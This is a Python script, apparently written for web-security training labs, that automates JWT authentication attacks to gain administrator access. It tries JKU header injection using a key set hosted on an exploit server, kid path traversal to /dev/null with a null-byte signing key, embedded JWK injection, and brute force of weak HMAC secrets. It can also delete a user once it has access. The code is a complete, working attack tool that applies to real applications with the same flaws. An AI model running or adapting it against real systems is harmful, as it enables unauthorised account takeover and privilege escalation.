import requests
import jwt
import argparse
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.backends import default_backend
from termcolor import cprint
import base64
import json
from urllib3.exceptions import InsecureRequestWarning
import urllib3
import uuid  # Import to generate a random UUID for the kid
import re
import hashlib
import hmac

# Suppress warnings if ignoring certificate validity
urllib3.disable_warnings(InsecureRequestWarning)

def print_jwt(token):
    """Print the header and payload of a JWT."""
    header = jwt.get_unverified_header(token)
    payload = jwt.decode(token, options={"verify_signature": False})
    cprint("JWT Header:", "yellow")
    print(json.dumps(header, indent=2))
    cprint("JWT Payload:", "yellow")
    print(json.dumps(payload, indent=2))

def is_jwt(token):
    """Check if the provided string is a valid JWT."""
    parts = token.split(".")
    if len(parts) != 3:
        print("Invalid JWT: " + token)
        return False
    if token.startswith("eyJraW"):
        try:
            # Decode the header and payload
            header = base64.urlsafe_b64decode(parts[0] + "==").decode("utf-8")
            payload = base64.urlsafe_b64decode(parts[1] + "==").decode("utf-8")
            # Check for common JWT fields
            #cprint("Header: " + header, "yellow")
            #cprint("Payload: " + payload, "yellow")
            return "alg" in header or "typ" in header or "sub" in payload
        except Exception:
            return False


def generate_jwk(public_key):
    public_numbers = public_key.public_numbers()

    # Generate a random UUID for the `kid`
    kid = str(uuid.uuid4())

    # Base64Url encode the public exponent (`e`) and modulus (`n`)
    e = base64.urlsafe_b64encode(public_numbers.e.to_bytes((public_numbers.e.bit_length() + 7) // 8, "big")).decode().rstrip("=")
    n = base64.urlsafe_b64encode(public_numbers.n.to_bytes((public_numbers.n.bit_length() + 7) // 8, "big")).decode().rstrip("=")

    # Construct the JWK object
    jwk = {
        "kty": "RSA",
        "e": e,  # Base64Url encoded exponent
        "n": n,  # Base64Url encoded modulus
        "kid": kid  # Key ID
    }
    return jwk, kid


def extract_exploit_url(base_url, proxies=None, verify=True):
    """Extract the exploit server URL from the base URL."""
    response = requests.get(base_url, proxies=proxies, verify=verify)
    if response.status_code != 200:
        raise Exception("Failed to fetch base URL page.")
    # Look for a URL matching the exploit server pattern
    match = re.search(r"https://exploit-[\w\-]+\.exploit-server\.net", response.text)
    return match.group(0) if match else None


def delete_carlos(admin_url, session_jwt, proxies=None, verify=True):
    """Delete Carlos from the admin page."""
    response = requests.get(admin_url+"/delete?username=carlos", cookies={"session": session_jwt}, proxies=proxies, verify=verify, allow_redirects=False)
    ret = response.status_code == 302
    if ret:
        cprint("Carlos deleted.", "green")
    else:
        cprint("Carlos not deleted.", "red")
    return ret


def generate_rsa_keys():
    """Helper function to generate RSA key pair."""
    private_key = rsa.generate_private_key(
        public_exponent=65537, key_size=2048, backend=default_backend()
    )
    public_key = private_key.public_key()
    return private_key, public_key


def get_csrf_token(login_url, proxies=None, verify=True):
    """Fetch CSRF token from the login page."""
    response = requests.get(login_url, proxies=proxies, verify=verify)
    if response.status_code != 200:
        raise Exception("Failed to fetch login page.")
    # Assuming CSRF token is in a hidden input field named 'csrf'
    token_start = response.text.find('name="csrf" value="') + len('name="csrf" value="')
    token_end = response.text.find('"', token_start)
    return response.text[token_start:token_end]


def authenticate(login_url, csrf_token, username, password, proxies=None, verify=True):
    """Authenticate using CSRF token, username, and password."""
    payload = {"csrf": csrf_token, "username": username, "password": password}
    response = requests.post(login_url, data=payload, proxies=proxies, verify=verify, allow_redirects=False)
    if response.status_code != 302:
        raise Exception("Authentication failed.")
    session_cookie = response.cookies.get("session")
    #cprint("Session cookie: " + session_cookie, "yellow")
    if is_jwt(session_cookie):
        cprint("Website uses JWT.\nProceed with attacks.", "green")
        return session_cookie
    else:
        raise Exception("Session is not a JWT.")


def upload_jwk_set(exploit_url, public_key):
    """Upload the Public Key as JWK Set to the exploit server."""
    
    jwk, kid = generate_jwk(public_key)
    jwk_set = {"keys": [jwk]}

    payload = {
        'urlIsHttps': 'on',
        'responseFile': '/exploit',
        'responseHead': 'HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8',
        'responseBody': json.dumps(jwk_set),
        'formAction': 'STORE'
    }

    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    response = requests.post(exploit_url, data=payload, headers=headers)
    if response.status_code == 200:
        cprint(f"Successfully uploaded JWK Set to {exploit_url}", "green")
        return kid
    else:
        raise Exception("Failed to upload JWK Set.")


def jku_attack(admin_url, session_jwt, exploit_url, proxies=None, verify=True, private_key=None, public_key=None):
    """Perform JKU header injection attack by creating a forged JWT."""
    if not private_key or not public_key:
        private_key, public_key = generate_rsa_keys()

    kid = upload_jwk_set(exploit_url, public_key)

    decoded_payload = jwt.decode(session_jwt, options={"verify_signature": False}, algorithms=["RS256"])
    decoded_payload["sub"] = "administrator"

    new_jwt = jwt.encode(
        decoded_payload,
        private_key,
        algorithm="RS256",
        headers={
            "alg": "RS256",
            "typ": "JWT",
            "kid": kid,
            "jku": exploit_url + "/exploit"  # The URL of the JWK Set
        }
    )

    cookies = {"session": new_jwt}
    response = requests.get(admin_url, cookies=cookies, proxies=proxies, verify=verify)

    if response.status_code == 200:
        cprint("JKU attack succeeded.\nYou can login with the following JWT:", "green")
        print(new_jwt)
        ret = True
    else:
        cprint("JKU attack failed.", "red")
        #print_jwt(new_jwt)
        ret = False
    return new_jwt, ret

def kid_path_traversal_attack(admin_url, session_jwt, proxies=None, verify=True):
    """Perform kid header path traversal attack by creating a forged JWT."""
    # Use null byte as the secret key
    secret_key = b'\x00'  # null byte
    
    # Decode the payload without verifying the signature
    decoded_payload = jwt.decode(session_jwt, options={"verify_signature": False})
    decoded_payload["sub"] = "administrator"

    # Create new JWT with path traversal in kid
    new_jwt = jwt.encode(
        decoded_payload,
        secret_key,
        algorithm="HS256",
        headers={
            "alg": "HS256",
            "typ": "JWT",
            "kid": "../../../../../../../dev/null"  # Path traversal to /dev/null
        }
    )

    cookies = {"session": new_jwt}
    response = requests.get(admin_url, cookies=cookies, proxies=proxies, verify=verify)

    if response.status_code == 200:
        cprint("Kid path traversal attack succeeded.\nYou can login with the following JWT:", "green")
        print(new_jwt)
        ret = True
    else:
        cprint("Kid path traversal attack failed.", "red")
        #print_jwt(new_jwt)
        ret = False
    return new_jwt, ret


def jwk_attack(admin_url, session_jwt, proxies=None, verify=True, private_key=None, public_key=None):
    """Perform JWK injection attack by creating a forged JWT."""
    if not private_key or not public_key:
        private_key, public_key = generate_rsa_keys()

    jwk, kid = generate_jwk(public_key)

    # Decode the payload without verifying the signature
    decoded_payload = jwt.decode(session_jwt, options={"verify_signature": False}, algorithms=["RS256"])
    decoded_payload["sub"] = "administrator"  # Modify the subject to escalate privileges

    # Craft the JWT with the updated header
    new_jwt = jwt.encode(
        decoded_payload,
        private_key,
        algorithm="RS256",
        headers={
            "alg": "RS256",
            "typ": "JWT",
            "kid": kid,
            "jwk": jwk
        }
    )

    cookies = {"session": new_jwt}
    response = requests.get(admin_url, cookies=cookies, proxies=proxies, verify=verify)

    if response.status_code == 200:
        cprint("JWK attack succeeded.\nYou can login with the following JWT:", "green")
        print(new_jwt)
        ret = True
    else:
        cprint("JWK attack failed.", "red")
        #print_jwt(new_jwt)
        ret = False
    return new_jwt, ret

def try_common_secrets():
    """Return a list of common JWT secrets."""
    return [
        'secret',
        'secret1',
        'secret123',
        'admin',
        'password',
        'letmein',
        '123456',
        'admin123',
        'secretkey',
        'key',
        'private',
        'mysecret',
    ]

def verify_signature(token, secret):
    """Verify if a secret can successfully validate a JWT signature."""
    try:
        # Split the JWT into parts
        header_b64, payload_b64, signature = token.split('.')
        # Create the message to be signed
        message = f"{header_b64}.{payload_b64}"
        # Get the algorithm from the header
        header = json.loads(base64.urlsafe_b64decode(header_b64 + '=' * (-len(header_b64) % 4)).decode())
        alg = header.get('alg', 'HS256')
        
        # Create signature
        if isinstance(secret, str):
            secret = secret.encode()
        
        if alg == 'HS256':
            new_signature = hmac.new(secret, message.encode(), hashlib.sha256).digest()
        else:
            return False
            
        # Compare signatures
        actual_signature = base64.urlsafe_b64decode(signature + '=' * (-len(signature) % 4))
        return hmac.compare_digest(new_signature, actual_signature)
    except Exception:
        return False

def weak_key_attack(admin_url, session_jwt, wordlist_file=None, proxies=None, verify=True):
    """Perform weak signing key attack by trying common secrets."""
    
    # Get secrets from file or use common secrets
    secrets = []
    if wordlist_file:
        try:
            with open(wordlist_file, 'r') as f:
                secrets.extend(line.strip() for line in f)
        except Exception as e:
            cprint(f"Error reading wordlist file: {str(e)}", "red")
            secrets.extend(try_common_secrets())
    else:
        secrets.extend(try_common_secrets())
    
    # Try each secret
    for secret in secrets:
        if verify_signature(session_jwt, secret):
            cprint(f"Found valid secret: {secret}", "green")
            
            # Create new JWT with admin privileges
            decoded_payload = jwt.decode(session_jwt, options={"verify_signature": False})
            decoded_payload["sub"] = "administrator"
            
            new_jwt = jwt.encode(
                decoded_payload,
                secret,
                algorithm="HS256"
            )
            
            # Verify if we got admin access
            response = requests.get(admin_url, cookies={"session": new_jwt}, proxies=proxies, verify=verify)
            if response.status_code == 200:
                cprint("Weak key attack succeeded!", "green")
                return new_jwt, True
    
    return None, False

def try_attacks(admin_url, session_jwt, base_url, proxies=None, verify=True, wordlist=None):
    """Try different JWT attacks until one succeeds."""
    
    # First check if exploit server exists
    exploit_url = extract_exploit_url(base_url, proxies=proxies, verify=verify)
    if exploit_url:
        cprint("Found exploit server. Attempting JKU attack first...", "yellow")
        new_jwt, ret = jku_attack(admin_url, session_jwt, exploit_url, proxies=proxies, verify=verify)
        if ret:
            return new_jwt
    else:
        cprint("No exploit server found. Trying other attacks...", "yellow")
    
    # Try KID path traversal attack
    cprint("Attempting KID path traversal attack...", "yellow")
    new_jwt, ret = kid_path_traversal_attack(admin_url, session_jwt, proxies=proxies, verify=verify)
    if ret:
        return new_jwt
    
    # Try JWK attack
    cprint("Attempting JWK attack...", "yellow")
    new_jwt, ret = jwk_attack(admin_url, session_jwt, proxies=proxies, verify=verify)
    if ret:
        return new_jwt

    # Try weak key attack as last resort
    cprint("Attempting weak key attack...", "yellow")
    new_jwt, ret = weak_key_attack(admin_url, session_jwt, wordlist, proxies=proxies, verify=verify)
    if ret:
        return new_jwt

    raise Exception("All attacks failed")

def main():
    parser = argparse.ArgumentParser(description="JWT Attack Script")
    parser.add_argument("-u", "--username", default="wiener", help="Username to authenticate with (default: wiener)")
    parser.add_argument("-p", "--password", default="peter", help="Password to authenticate with (default: peter)")
    parser.add_argument("-w", "--website", required=True, help="Base URL of the target website")
    parser.add_argument("-x", "--proxy", help="Proxy server to use (e.g., 127.0.0.1:8080)")
    parser.add_argument("-i", "--ignore-cert", action="store_true", help="Ignore SSL certificate validation")
    parser.add_argument("-d", "--delete", action="store_true", help="Delete Carlos")
    parser.add_argument("-l", "--wordlist", help="Path to JWT secrets wordlist file")
    args = parser.parse_args()

    base_url = args.website.rstrip("/")
    login_url = f"{base_url}/login"
    admin_url = f"{base_url}/admin"

    proxies = {"http": f"http://{args.proxy}", "https": f"http://{args.proxy}"} if args.proxy else None
    verify = not args.ignore_cert

    try:
        # Step 1: Get CSRF token
        csrf_token = get_csrf_token(login_url, proxies=proxies, verify=verify)

        # Step 2: Authenticate and get JWT session
        session_jwt = authenticate(login_url, csrf_token, args.username, args.password, proxies=proxies, verify=verify)

        # Step 3: Try different attacks until one succeeds
        new_jwt = try_attacks(admin_url, session_jwt, base_url, proxies=proxies, verify=verify, wordlist=args.wordlist)

        if args.delete:
            delete_carlos(admin_url, new_jwt, proxies=proxies, verify=verify)

    except Exception as e:
        cprint(f"Error: {str(e)}", "red")


if __name__ == "__main__":
    main()

